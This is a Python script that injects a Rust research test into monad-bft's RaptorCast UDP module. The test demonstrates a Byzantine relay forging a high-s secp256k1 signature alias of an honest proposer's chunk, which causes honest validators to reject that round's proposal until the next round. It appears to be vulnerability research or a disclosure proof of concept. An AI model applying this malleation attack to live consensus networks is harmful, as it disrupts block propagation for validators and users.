from __future__ import annotations

from pathlib import Path

TARGET = Path("monad-bft/monad-raptorcast/src/udp.rs")
MARKER = "research_honest_proposer_high_s_relay_poison_recovers_next_round"

TEST_CODE = r'''

    fn research_relay_sub_be_32_high_s(a: &[u8; 32], b: &[u8; 32]) -> [u8; 32] {
        let mut out = [0u8; 32];
        let mut borrow = 0u16;
        for i in (0..32).rev() {
            let ai = a[i] as u16;
            let bi = b[i] as u16 + borrow;
            if ai >= bi {
                out[i] = (ai - bi) as u8;
                borrow = 0;
            } else {
                out[i] = (ai + 256 - bi) as u8;
                borrow = 1;
            }
        }
        assert_eq!(borrow, 0);
        out
    }

    fn research_relay_malleate_signature(payload: &bytes::Bytes) -> bytes::Bytes {
        use bytes::BytesMut;

        let mut out = BytesMut::from(payload.as_ref());
        assert!(out.len() >= crate::SIGNATURE_SIZE);
        let mut low_s = [0u8; 32];
        low_s.copy_from_slice(&out[32..64]);
        let high_s = research_relay_sub_be_32_high_s(
            &[
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xfe,
                0xba, 0xae, 0xdc, 0xe6, 0xaf, 0x48, 0xa0, 0x3b,
                0xbf, 0xd2, 0x5e, 0x8c, 0xd0, 0x36, 0x41, 0x41,
            ],
            &low_s,
        );
        out[32..64].copy_from_slice(&high_s);
        out[64] ^= 1;
        out.freeze()
    }

    #[test]
    fn research_honest_proposer_high_s_relay_poison_recovers_next_round() {
        use std::{
            collections::BTreeMap,
            net::{IpAddr, Ipv4Addr, SocketAddr},
        };

        use monad_crypto::{
            certificate_signature::{CertificateKeyPair, PubKey as _},
            hasher::{Hasher, HasherType},
        };
        use monad_secp::{KeyPair, SecpSignature};
        use monad_types::{Epoch, NodeId, Round, Stake};
        use monad_validator::validator_set::ValidatorSet;

        use crate::{
            auth::AuthRecvMsg,
            packet::{deterministic::PrimaryEncoding, MessageBuilder},
            util::{
                BuildTarget, EncodingScheme, FullNodeGroupMap, PrimaryBroadcastGroup,
                Redundancy, StubProposerSchedule,
            },
            v1_rollout::DeterministicProtocolRolloutStage,
        };

        fn key(seed: u8) -> KeyPair {
            let mut hasher = HasherType::new();
            hasher.update([seed]);
            let mut bytes = hasher.hash().0;
            KeyPair::from_bytes(&mut bytes).expect("valid deterministic key")
        }

        let byzantine_key = key(1);
        let honest_one_key = key(2);
        let honest_two_key = key(3);
        let proposer_key = key(4);

        let byzantine = NodeId::new(byzantine_key.pubkey());
        let honest_one = NodeId::new(honest_one_key.pubkey());
        let honest_two = NodeId::new(honest_two_key.pubkey());
        let proposer = NodeId::new(proposer_key.pubkey());

        let epoch = Epoch(1);
        let validators = ValidatorSet::new_unchecked(
            [
                (byzantine, Stake::ONE),
                (honest_one, Stake::ONE),
                (honest_two, Stake::ONE),
                (proposer, Stake::ONE),
            ]
            .into(),
        );
        let validator_map: BTreeMap<_, _> = [(epoch, validators)].into();

        let feed = |
            state: &mut UdpState<SecpSignature>,
            payload: bytes::Bytes,
            stride: usize,
            sender: NodeId<monad_secp::PubKey>,
        | {
            state.handle_message(
                &validator_map,
                &FullNodeGroupMap::default(),
                &StubProposerSchedule::VALID,
                |_, _, _| {},
                AuthRecvMsg {
                    src_addr: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 9000),
                    payload,
                    stride: u16::try_from(stride).unwrap(),
                    sender: Some(sender),
                },
            )
        };

        let poisoned_round = Round(42);
        let poisoned_timestamp = 1_700_000_000_000u64;
        let poisoned_message = vec![0xA5u8; 128 * 1024];
        let build_group =
            PrimaryBroadcastGroup::of_epoch(epoch, &proposer, &validator_map).unwrap();
        let poisoned_packets = MessageBuilder::<SecpSignature>::new(&proposer_key)
            .unix_ts_ms(poisoned_timestamp)
            .redundancy(Redundancy::from_u8(2))
            .build_vec(
                &poisoned_message,
                &BuildTarget::deterministic_raptorcast(build_group, poisoned_round),
            )
            .expect("honest deterministic V1 proposal builds");
        assert!(poisoned_packets.len() > 2);

        let assignment_group =
            PrimaryBroadcastGroup::of_epoch(epoch, &proposer, &validator_map).unwrap();
        let encoding = PrimaryEncoding::new(
            EncodingScheme::Deterministic25(poisoned_round),
            &assignment_group,
            poisoned_message.len(),
            poisoned_timestamp,
        )
        .expect("primary deterministic encoding builds");
        let assignment = encoding.make_assignment().expect("assignment builds");
        let poison_index = (0usize..assignment.num_chunks())
            .find(|chunk_id| {
                assignment
                    .resolve_chunk_id(*chunk_id)
                    .is_some_and(|routing| routing.recipient() == &byzantine)
            })
            .expect("Byzantine relay receives at least one first-hop chunk");
        let alias = research_relay_malleate_signature(
            &poisoned_packets[poison_index].payload,
        );
        assert_ne!(alias, poisoned_packets[poison_index].payload);

        let mut clean_control =
            UdpState::<SecpSignature>::new(honest_one, u64::MAX, 10_000);
        let mut poisoned_one =
            UdpState::<SecpSignature>::new(honest_one, u64::MAX, 10_000);
        let mut poisoned_two =
            UdpState::<SecpSignature>::new(honest_two, u64::MAX, 10_000);
        for state in [&mut clean_control, &mut poisoned_one, &mut poisoned_two] {
            state.set_v1_rollout(DeterministicProtocolRolloutStage::AcceptBothPublishV0);
            state.update_current_round(poisoned_round);
        }

        assert_eq!(
            feed(
                &mut poisoned_one,
                alias.clone(),
                poisoned_packets[poison_index].stride,
                byzantine,
            )
            .len(),
            0,
        );
        assert_eq!(
            feed(
                &mut poisoned_two,
                alias,
                poisoned_packets[poison_index].stride,
                byzantine,
            )
            .len(),
            0,
        );

        let mut control_count = 0usize;
        let mut poisoned_one_count = 0usize;
        let mut poisoned_two_count = 0usize;
        for packet in &poisoned_packets {
            control_count += feed(
                &mut clean_control,
                packet.payload.clone(),
                packet.stride,
                proposer,
            )
            .len();
            poisoned_one_count += feed(
                &mut poisoned_one,
                packet.payload.clone(),
                packet.stride,
                proposer,
            )
            .len();
            poisoned_two_count += feed(
                &mut poisoned_two,
                packet.payload.clone(),
                packet.stride,
                proposer,
            )
            .len();
        }
        eprintln!("MARKER_V3_DEFAULT_STAGE_V1_CONTROL_ROUND42={control_count}");
        eprintln!("MARKER_V3_POISONED_HONEST_ONE_ROUND42={poisoned_one_count}");
        eprintln!("MARKER_V3_POISONED_HONEST_TWO_ROUND42={poisoned_two_count}");
        assert_eq!(control_count, 1, "AcceptBothPublishV0 accepts honest V1");
        assert_eq!(poisoned_one_count, 0, "first honest receiver is poisoned");
        assert_eq!(poisoned_two_count, 0, "second honest receiver is poisoned");

        let recovery_round = Round(43);
        poisoned_one.update_current_round(recovery_round);
        poisoned_two.update_current_round(recovery_round);
        let recovery_message = vec![0x5Au8; 128 * 1024];
        let recovery_group =
            PrimaryBroadcastGroup::of_epoch(epoch, &proposer, &validator_map).unwrap();
        let recovery_packets = MessageBuilder::<SecpSignature>::new(&proposer_key)
            .unix_ts_ms(poisoned_timestamp + 4_096)
            .redundancy(Redundancy::from_u8(2))
            .build_vec(
                &recovery_message,
                &BuildTarget::deterministic_raptorcast(recovery_group, recovery_round),
            )
            .expect("next honest V1 proposal builds");

        let mut recovered_one = 0usize;
        let mut recovered_two = 0usize;
        for packet in &recovery_packets {
            recovered_one += feed(
                &mut poisoned_one,
                packet.payload.clone(),
                packet.stride,
                proposer,
            )
            .len();
            recovered_two += feed(
                &mut poisoned_two,
                packet.payload.clone(),
                packet.stride,
                proposer,
            )
            .len();
        }
        eprintln!("MARKER_V3_RECOVERED_HONEST_ONE_ROUND43={recovered_one}");
        eprintln!("MARKER_V3_RECOVERED_HONEST_TWO_ROUND43={recovered_two}");
        assert_eq!(recovered_one, 1, "first poisoned receiver recovers");
        assert_eq!(recovered_two, 1, "second poisoned receiver recovers");
        eprintln!("MARKER_V3_TEST_COMPLETE=1");
    }
'''

text = TARGET.read_text()
if MARKER in text:
    raise SystemExit(f"test already present in {TARGET}")
insert_at = text.rfind("\n}")
if insert_at < 0:
    raise SystemExit(f"could not locate final module brace in {TARGET}")
TARGET.write_text(text[:insert_at] + TEST_CODE + text[insert_at:])
print(f"Injected {MARKER} into {TARGET}")
